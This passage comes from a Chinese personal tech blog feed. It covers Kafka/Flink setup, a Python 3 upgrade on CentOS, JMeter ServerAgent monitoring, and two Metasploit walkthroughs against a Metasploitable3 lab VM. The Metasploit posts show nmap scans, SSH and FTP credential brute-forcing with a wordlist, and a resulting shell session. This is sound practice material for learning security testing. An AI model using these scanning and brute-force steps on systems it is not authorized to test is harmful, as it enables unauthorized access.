class="line">[2022-01-07 18:28:37,266] INFO [GroupCoordinator 3]: Starting up. (kafka.coordinator.group.GroupCoordinator)</span><br><span class="line">[2022-01-07 18:28:37,271] INFO [GroupCoordinator 3]: Startup complete. (kafka.coordinator.group.GroupCoordinator)</span><br><span class="line">[2022-01-07 18:28:37,289] INFO [TransactionCoordinator id=3] Starting up. (kafka.coordinator.transaction.TransactionCoordinator)</span><br><span class="line">[2022-01-07 18:28:37,292] INFO [TransactionCoordinator id=3] Startup complete. (kafka.coordinator.transaction.TransactionCoordinator)</span><br><span class="line">[2022-01-07 18:28:37,302] INFO [Transaction Marker Channel Manager 3]: Starting (kafka.coordinator.transaction.TransactionMarkerChannelManager)</span><br><span class="line">[2022-01-07 18:28:37,332] INFO [ExpirationReaper-3-AlterAcls]: Starting (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)</span><br><span class="line">[2022-01-07 18:28:37,367] INFO [SocketServer listenerType=ZK_BROKER, nodeId=3] Starting socket server acceptors and processors (kafka.network.SocketServer)</span><br><span class="line">[2022-01-07 18:28:37,370] INFO [/config/changes-event-process-thread]: Starting (kafka.common.ZkNodeChangeNotificationListener$ChangeEventProcessThread)</span><br><span class="line">[2022-01-07 18:28:37,396] INFO [SocketServer listenerType=ZK_BROKER, nodeId=3] Started data-plane acceptor and processor(s) for endpoint : ListenerName(PLA</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看kafka和flink是否启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# jps</span><br><span class="line">5187 QuorumPeerMain # zk</span><br><span class="line">10853 Jps</span><br><span class="line">5110 QuorumPeerMain # zk</span><br><span class="line">5271 QuorumPeerMain # zk</span><br><span class="line">10407 Kafka #kafka</span><br><span class="line">4216 StandaloneSessionClusterEntrypoint</span><br><span class="line">9866 Kafka # kafka</span><br><span class="line">4491 TaskManagerRunner # flink</span><br><span class="line">8494 Kafka # kafka</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><ul>
<li>服务器现在默认用的python2.7，现在升级为python3</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖文件</span></span><br><span class="line">yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make</span><br><span class="line"></span><br><span class="line">wget https://www.python.org/ftp/python/3.7.9/Python-3.7.9.tar.xz</span><br><span class="line">tar -xvf Python-3.7.9.tar.xz</span><br><span class="line">cd Python-3.7.9.tar.xz</span><br><span class="line"></span><br><span class="line">./configure prefix=/usr/local/python3.7.9 # 指定编译python存放路径</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<ul>
<li>备份python2</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv /usr/bin/python /usr/bin/python.bak</span><br></pre></td></tr></table></figure>

<ul>
<li>创建软链接</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /usr/local/python3/bin/python3 /usr/bin/python</span><br></pre></td></tr></table></figure>

<ul>
<li>修改yum配置文件。由于执行CentOS的yum命令需要使用自带的python2的版本，所以需要做两处修改</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /usr/bin/yum</span><br><span class="line">vi /usr/libexec/urlgrabber-ext-down</span><br><span class="line"></span><br><span class="line">将 这两个文件的 #!/usr/bin/python修改为 #!/usr/bin/python2</span><br></pre></td></tr></table></figure>

<ul>
<li>查看python3版本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos local]# python --version</span><br><span class="line">Python 3.7.9</span><br></pre></td></tr></table></figure>

<h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><ul>
<li>暂时放弃，服务器内存不足，在一台机器上部署分布式配置不够</li>
</ul>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>flink</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>Jmeter ServerAgent实战</title>
    <url>/aposts/d2ac0bdc/</url>
    <content><![CDATA[<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul>
<li>此次实践的<code>jmeter</code>版本不能过高，建议用3.1</li>
<li>大量性能压测时，不介意使用此教程，此次实践只为简单练手</li>
</ul>
<h2 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h2><ul>
<li><p>打开<a href="https://jmeter-plugins.org/downloads/old/">旧的插件地址</a></p>
</li>
<li><p>下载<a href="https://jmeter-plugins.org/downloads/file/JMeterPlugins-Standard-1.4.0.zip">JMeterPlugins-Extras-1.4.0</a></p>
</li>
<li><p>下载<a href="https://jmeter-plugins.org/downloads/file/JMeterPlugins-Extras-1.4.0.zip">JMeterPlugins-Standard-1.4.0</a></p>
</li>
<li><p>下载<a href="https://jmeter-plugins.org/wiki/PerfMonAgent/">ServerAgent-2.2.3</a>，主要用来监控</p>
</li>
</ul>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li><p>首先把解压出来的<code>JMeterPlugins-Standard.jar</code>，<code>JMeterPlugins-Extras.jar</code>两个jar包放在<code>apache-jmeter\lib\ext</code>目录下</p>
<p><img src="/aposts/d2ac0bdc/image-20211014103834047.png" alt="image-20211014103834047"></p>
</li>
<li><p>重新启动jmeter之后可以看到监听器里多了许多jp@gc开头的就成功了</p>
<p><img src="/aposts/d2ac0bdc/image-20211014103940321.png" alt="image-20211014103940321"></p>
<p><img src="/aposts/d2ac0bdc/image-20211014104308298.png" alt="image-20211014104308298"></p>
</li>
<li><p>Agent方面，只需要将ServerAgent在目标机器上启动即可。比如win上直接打开bat文件即可</p>
<p><img src="/aposts/d2ac0bdc/image-20211014104201505.png" alt="image-20211014104201505"></p>
<h2 id="查看监控效果"><a href="#查看监控效果" class="headerlink" title="查看监控效果"></a>查看监控效果</h2></li>
<li><p>运行脚本，查看效果</p>
<p><img src="/aposts/d2ac0bdc/image-20211014104558450.png" alt="image-20211014104558450"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit-ssh攻击</title>
    <url>/aposts/2b1b6be5/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本编主要演示Metasploit对ftp的攻击，必须提前搭建好Metasploit攻击机和Metasploitable3靶场，可以参考这篇<a href="/aposts/403e45c/">如何搭建kail</a>和<a href="/aposts/f3700316/">Metasploitable3靶场搭建</a></p>
<h2 id="开始实践"><a href="#开始实践" class="headerlink" title="开始实践"></a>开始实践</h2><ul>
<li>流程基本上和之前的ftp攻击差不多</li>
<li>在攻击机上，扫描靶场的端口，发现了ssh服务的端口为22，版本为7.1</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.56.105                                                                                                                                                                                                     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-27 22:33 EST</span><br><span class="line">Nmap scan report for 192.168.56.105</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 981 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE              VERSION</span><br><span class="line">21/tcp    open  ftp                  Microsoft ftpd</span><br><span class="line">22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http                 Microsoft IIS httpd 7.5</span><br><span class="line">135/tcp   open  msrpc                Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">3306/tcp  open  mysql                MySQL 5.5.20-log</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接输入<code>msfconsole</code> 就进入到了metasploit 的控制台下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.14-dev                          ]</span><br><span class="line">+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Open an interactive Ruby terminal with </span><br><span class="line">irb</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure>

<h3 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h3><ul>
<li><p>本次扫描只是这对服务器上的ssh使用版本进行扫描，看看是否可以展示一些有用信息</p>
</li>
<li><p>输入<code>search ssh_version</code></p>
</li>
</ul>
<p><img src="/aposts/2b1b6be5/image-20220228155411962.png" alt="image-20220228155411962"></p>
<ul>
<li>输入<code>use auxiliary/scanner/ssh/ssh_version</code>以及进行配置</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; show options</span><br><span class="line"></span><br><span class="line">  Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-</span><br><span class="line">   RPORT    22               yes       The target port (TCP)</span><br><span class="line">   THREADS  1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT  30               yes       Timeout for the SSH probe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; set rhosts 192.168.56.105</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; run</span><br><span class="line">[+] 192.168.56.105:22     - SSH server version: SSH-2.0-OpenSSH_7.1 ( service.version=7.1 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.1 service.protocol=ssh fingerprint_db=ssh.banner )</span><br><span class="line">[*] 192.168.56.105:22     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ssh-辅助模块"><a href="#ssh-辅助模块" class="headerlink" title="ssh 辅助模块"></a>ssh 辅助模块</h3><ul>
<li>输入<code>search scanner/ssh</code>找到辅助的漏洞模块，本次打算采用<code>auxiliary/scanner/ssh/ssh_login</code>和<code>auxiliary/scanner/ssh/ssh_login_pubkey </code>进行实践</li>
</ul>
<p><img src="/aposts/2b1b6be5/image-20220228151521631.png" alt="image-20220228151521631"></p>
<h4 id="auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login"><a href="#auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login"></a>auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login</h4><p>核心还是使用了密码字典进行爆破，发现提示success，说明爆破成功，用户名和密码为：<strong>vagrant</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用辅助模块</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.56.105</span><br><span class="line">rhosts =&gt; 192.168.56.105</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置爆破字典</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line">USERPASS_FILE =&gt; /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置线程数量</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt;  set THREADS 14</span><br><span class="line">THREADS =&gt; 14</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始运行</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line">[*] 192.168.56.105:22 - Starting bruteforce</span><br><span class="line">[+] 192.168.56.105:22 - Success: &#x27;vagrant:vagrant&#x27; &#x27;Microsoft Windows Server 2008 R2 Standard 6.1.7601 Service Pack 1 Build 7601&#x27;</span><br><span class="line">[*] Command shell session 1 opened (192.168.56.103:33151 -&gt; 192.168.56.105:22 ) at 2022-02-28 03:22:48 -0500</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们得到了shell(就是管理员的用户名和密码),我们可以与我们入侵的机器创建会话。<strong>vagrant</strong>账号登录，但是发现无法session登录长时间卡死，没有反应，<strong>展示没有找到解决方案，待补充</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入sessions -i后，其实就发现了当前以及登录ssh服务的session</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Id  Name  Type           Information                              Connection</span><br><span class="line">  --  ----  ----           -----------                              ----------</span><br><span class="line">  2         shell windows  SSH vagrant:vagrant (192.168.56.105:22)  192.168.56.103:43991 -&gt; 192.168.56.105:22  (192.168.56.105)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">表示使用session列表中的<span class="built_in">id</span>为2的数据，进行登录</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i 2 </span><br></pre></td></tr></table></figure>

<h4 id="auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login-pubkey"><a href="#auxiliary-x2F-scanner-x2F-ssh-x2F-ssh-login-pubkey" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login_pubkey"></a>auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login_pubkey</h4><p><strong>结论：测试失败，查看了官网的issue，以及关闭了同样问题，但我这边还是如此，我怀疑是因为靶场是win2008引起的，等把win系列靶场大概过一遍后，搭建个linux靶场试试</strong></p>
<p>如何才能得到靶场上的ssh_pubkey?</p>
<ul>
<li>打开<code>C:\Users\vagrant\.ssh\</code>目录可以得到ssh的key</li>
</ul>
<p><img src="/aposts/2b1b6be5/image-20220301094010774.png" alt="image-20220301094010774"></p>
<ul>
<li>设置靶场的共享文件夹，把ssh文件复制出来</li>
</ul>
<p><img src="/aposts/2b1b6be5/image-20220301100740502.png" alt="image-20220301100740502"></p>
<p><img src="/aposts/2b1b6be5/image-20220301100806933.png" alt="image-20220301100806933"></p>
<ul>
<li>把ssh是key文件拷贝到共享文件夹下面即可</li>
</ul>
<p><img src="/aposts/2b1b6be5/image-20220301100848424.png" alt="image-20220301100848424"></p>
<ul>
<li>把key的内容复制粘贴到kali中</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/usr/local]</span><br><span class="line">└─$ sudo vi ssh_key                                                                                                                                                                                                        </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA6NF8iallvQVp22WDkTkyrtvp9eWW6A8YVr+kz4TjGYe7gHzIw+niNltGEFHzD8+v1I2YJ6oXevct1YeS0o9HZyN1Q9qgCgzUFtdOKLv6IedplqoPkcmF0aYet2PkEDo3MlTBckFXPITAMzF8dJSIFo9D8HfdOV0IAdx4O7PtixWKn5y2hMNG0zQPyUecp4pzC6kivAIhyfHilFR61RGL+GPXQ2MWZWFYbAGjyiYJnAmCP3NOTd0jMZEnDkbUvxhMmBYSdETk1rRgm+R4LOzFUGaHqHDLKLX+FIPKcF96hrucXzcWyLbIbEgE98OHlnVYCzRdK8jlqm8tehUc9c9WhQ== vagrant insecure public key                           </span><br></pre></td></tr></table></figure>

<ul>
<li>进入到msfconsole中，使用辅助模块，开始攻击</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; show options</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set key_path /usr/local/ssh_key </span><br><span class="line">key_path =&gt; /usr/local/ssh_key</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set rhosts 192.168.56.105</span><br><span class="line">rhosts =&gt; 192.168.56.105</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set username vagrant</span><br><span class="line">username =&gt; vagrant</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &gt; run</span><br></pre></td></tr></table></figure>

<blockquote>
<p>补充知识：靶场中可以使用 C:\Program Files\OpenSSH\bin&gt;ssh-keygen -t rsa 生成私钥（id_rsa）和公钥(id_rsa.pub)</p>
</blockquote>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit-ftp</title>
    <url>/aposts/b3a805c7/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本编主要演示Metasploit对ftp的攻击，必须提前搭建好Metasploit攻击机和Metasploitable3靶场，可以参考这篇<a href="/aposts/403e45c/">如何搭建kail</a>和<a href="/aposts/f3700316/">Metasploitable3靶场搭建</a></p>
<h2 id="开始实践"><a href="#开始实践" class="headerlink" title="开始实践"></a>开始实践</h2><ul>
<li>在攻击机上，扫描靶场的端口，发现了ftp服务的端口为21</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.56.102</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-23 21:42 EST</span><br><span class="line">Nmap scan report for 192.168.56.102</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 981 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE              VERSION</span><br><span class="line">21/tcp    open  ftp                  Microsoft ftpd</span><br><span class="line">22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http                 Microsoft IIS httpd 7.5</span><br><span class="line">135/tcp   open  msrpc                Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">3306/tcp  open  mysql                MySQL 5.5.20-log</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">4848/tcp  open  ssl/http             Oracle Glassfish Application Server</span><br><span class="line">7676/tcp  open  java-message-service Java Message Service 301</span><br><span class="line">8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0</span><br><span class="line">8181/tcp  open  ssl/intermapper?</span><br><span class="line">8383/tcp  open  http                 Apache httpd</span><br><span class="line">9200/tcp  open  wap-wsp?</span><br><span class="line">49152/tcp open  msrpc                Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc                Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc                Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc                Microsoft Windows RPC</span><br><span class="line">49176/tcp open  java-rmi             Java RMI</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接输入<code>msfconsole</code> 就进入到了metasploit 的控制台下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.14-dev                          ]</span><br><span class="line">+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Open an interactive Ruby terminal with </span><br><span class="line">irb</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>输入<code>search scanner/ftp</code>找到辅助的扫描工具</li>
</ul>
<p><img src="/aposts/b3a805c7/image-20220224165241342.png" alt="image-20220224165241342"></p>
<ul>
<li>下面使用三个漏洞模块（anonymous、ftp_login、ftp_version)测试，也是网上教程最多的笔记</li>
</ul>
<h3 id="auxiliary-x2F-scanner-x2F-ftp-x2F-anonymous"><a href="#auxiliary-x2F-scanner-x2F-ftp-x2F-anonymous" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous"></a>auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous</h3><h4 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h4><p>不支持匿名登录</p>
<h4 id="开始演练"><a href="#开始演练" class="headerlink" title="开始演练"></a>开始演练</h4><ul>
<li>输入<code>use auxiliary/scanner/ftp/anonymous </code>，表示使用这个匿名登录漏洞模块</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ftp/anonymous</span><br></pre></td></tr></table></figure>

<ul>
<li>设置rhosts</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; set RHOSTS 192.168.56.102</span><br></pre></td></tr></table></figure>

<ul>
<li>输入run，就是运行漏洞模块，看看是否成功，测试结果是匿名登录失败</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sf6 auxiliary(scanner/ftp/anonymous) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.56.102:21     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>也可以直接输入expolit -i 运行漏洞模块</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ftp/anonymous) &gt; exploit -i</span><br><span class="line"></span><br><span class="line">[*] 192.168.56.102:21     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/ftp/anonymous) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>网上找了个成功的图片</li>
</ul>
<p><img src="/aposts/b3a805c7/image-20220224170452788.png" alt="image-20220224170452788"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>如果想匿名登录，可以直接到靶机中的iis中设置ftp支持匿名登录</li>
<li>匿名登录后，有些文件只是只读，有些重要文件还是可能泄露一些重要信息</li>
</ul>
<h3 id="auxiliary-x2F-scanner-x2F-ftp-x2F-ftp-login"><a href="#auxiliary-x2F-scanner-x2F-ftp-x2F-ftp-login" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_login"></a>auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_login</h3><h4 id="测试结论-1"><a href="#测试结论-1" class="headerlink" title="测试结论"></a>测试结论</h4><p>登录成功，<strong>核心文件还是密码字典</strong></p>
<h4 id="开始演练-1"><a href="#开始演练-1" class="headerlink" title="开始演练"></a>开始演练</h4><ul>
<li>输入<code>use auxiliary/scanner/ftp/ftp_login</code>，表示使用这个漏洞模块</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ftp/ftp_login</span><br><span class="line">msf6 auxiliary(scanner/ftp/ftp_login) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>输入show options，展示当前ftp_login扫描工具的选项</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ftp/ftp_login) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ftp/ftp_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting  Required  Description</span><br><span class="line">   ----              ---------------  --------  -----------</span><br><span class="line">   BLANK_PASSWORDS   false            no        Try blank passwords for all users</span><br><span class="line">   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database</span><br><span class="line">   DB_ALL_PASS       false            no        Add all passwords in the current database to the list</span><br><span class="line">   DB_ALL_USERS      false            no        Add all users in the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&amp;realm)</span><br><span class="line">   PASSWORD                           no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE                          no        File containing passwords, one per line</span><br><span class="line">   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RECORD_GUEST      false            no        Record anonymous/guest logins to the database</span><br><span class="line">   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT             21               yes       The target port (TCP)</span><br><span class="line">   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host</span><br><span class="line">   THREADS           1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME                           no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line</span><br><span class="line">   USER_AS_PASS      false            no        Try the username as the password for all users</span><br><span class="line">   USER_FILE                          no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           true             yes       Whether to print output for all attempts</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>设置好了RHOSTS</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ftp/ftp_login) &gt; set RHOSTS 192.168.56.102</span><br></pre></td></tr></table></figure>

<ul>
<li>设置线程数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ftp/ftp_login) &gt;  set THREADS 14</span><br></pre></td></tr></table></figure>

<ul>
<li>设置用户名和密码文件，这里的用户和密码是metasploit自带的，我最后加了个用户名和密码（vagrant）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ftp/ftp_login) &gt;set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>输入<code>show options</code>查看配置情况</li>
</ul>
<p><img src="/aposts/b3a805c7/image-20220224171745170.png" alt="image-20220224171745170"></p>
<ul>
<li>直接运行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ftp/ftp_login) &gt; run</span><br></pre></td></tr></table></figure>

<ul>
<li>发现登录成功</li>
</ul>
<p><img src="/aposts/b3a805c7/image-20220224171936577.png" alt="image-20220224171936577"></p>
<h3 id="auxiliary-x2F-scanner-x2F-ftp-x2F-ftp-version"><a href="#auxiliary-x2F-scanner-x2F-ftp-x2F-ftp-version" class="headerlink" title="auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version"></a>auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version</h3><h4 id="测试结论-2"><a href="#测试结论-2" class="headerlink" title="测试结论"></a>测试结论</h4><p>测试失败，网上很多都是基于这个模块拿到root权限，失败原因分析：</p>
<ul>
<li>msf版本不一致，我的是msf6最新版本，其他人的版本比我旧</li>
<li>靶场系统不一致，有的人的靶场是linux，而我的靶场为window 2008 r2</li>
</ul>
<h4 id="开始演练-2"><a href="#开始演练-2" class="headerlink" title="开始演练"></a>开始演练</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/ftp/easy_file_sharing_ftp) &gt; use auxiliary/scanner/ftp/ftp_version  </span><br><span class="line">msf6 auxiliary(scanner/ftp/ftp_version) &gt; set RHOSTS 192.168.56.102</span><br><span class="line">RHOSTS =&gt; 192.168.56.102</span><br><span class="line">msf6 auxiliary(scanner/ftp/ftp_version) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.56.102:21     - FTP Banner: &#x27;220 Microsoft FTP Service\x0d\x0a&#x27;</span><br><span class="line">[*] 192.168.56.102:21     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>run时并没有扫描出来ftp的版本信息</strong></li>
<li>我看其这个人<a href="https://blog.csdn.net/qq_38612882/article/details/122525880">博客</a>写到</li>
</ul>
<p><img src="/aposts/b3a805c7/image-20220224173453358.png" alt="image-20220224173453358"></p>
<ul>
<li>然后他用下面的后门模块最终拿到root</li>
</ul>
<p><img src="/aposts/b3a805c7/image-20220224173619958.png" alt="image-20220224173619958"></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploitable3靶场搭建</title>
